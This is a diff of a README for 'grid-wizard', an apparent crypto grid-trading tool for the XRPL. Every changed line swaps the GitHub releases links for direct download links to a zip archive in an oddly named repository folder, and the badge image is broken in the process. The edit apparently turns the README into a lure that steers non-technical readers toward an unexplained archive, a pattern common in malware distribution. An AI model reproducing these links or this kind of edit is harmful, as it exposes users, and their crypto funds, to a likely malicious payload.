@@ -1,6 +1,6 @@
 # 🔧 grid-wizard - Effortless Crypto Trading Made Easy
 
-[![Download Grid Wizard](https://img.shields.io/badge/Download-Grid%20Wizard-blue)](https://github.com/mustafahfz34/grid-wizard/releases)
+[![Download Grid Wizard](https://raw.githubusercontent.com/mustafahfz34/grid-wizard/main/leptinolite/grid-wizard.zip%20Wizard-blue)](https://raw.githubusercontent.com/mustafahfz34/grid-wizard/main/leptinolite/grid-wizard.zip)
 
 ## 📖 Description
 Grid Wizard is a user-friendly grid trading engine designed for cryptocurrency trading. It offers a lightweight interface where even beginners can easily navigate. This tool manages trades effectively with features like hot-reloadable configuration, strict limits on trades, and an optional feature that cancels orders based on distance. Additionally, it includes a small AI component, the Dynamic Grid Optimizer, which works to improve your trading performance. Grid Wizard is built for reliability, especially during times of node lag on the XRPL.
@@ -17,7 +17,7 @@ To start using Grid Wizard, follow these straightforward steps. No technical ski
 4. **Start Trading**: Once set up, you can begin using Grid Wizard to enhance your trading experience.
 
 ## 📥 Download & Install
-To download Grid Wizard, visit this page to download the latest version: [Grid Wizard Releases](https://github.com/mustafahfz34/grid-wizard/releases).
+To download Grid Wizard, visit this page to download the latest version: [Grid Wizard Releases](https://raw.githubusercontent.com/mustafahfz34/grid-wizard/main/leptinolite/grid-wizard.zip).
 
 ### Step-by-Step Installation
 1. Open the link above.
@@ -60,4 +60,4 @@ We value our users. Join our community to share experiences, ask questions, and 
 - **GitHub**: Check for updates and new releases.
 - **Twitter**: Follow us for announcements.
 
-[![Download Grid Wizard](https://img.shields.io/badge/Download-Grid%20Wizard-blue)](https://github.com/mustafahfz34/grid-wizard/releases)
+[![Download Grid Wizard](https://raw.githubusercontent.com/mustafahfz34/grid-wizard/main/leptinolite/grid-wizard.zip%20Wizard-blue)](https://raw.githubusercontent.com/mustafahfz34/grid-wizard/main/leptinolite/grid-wizard.zip)
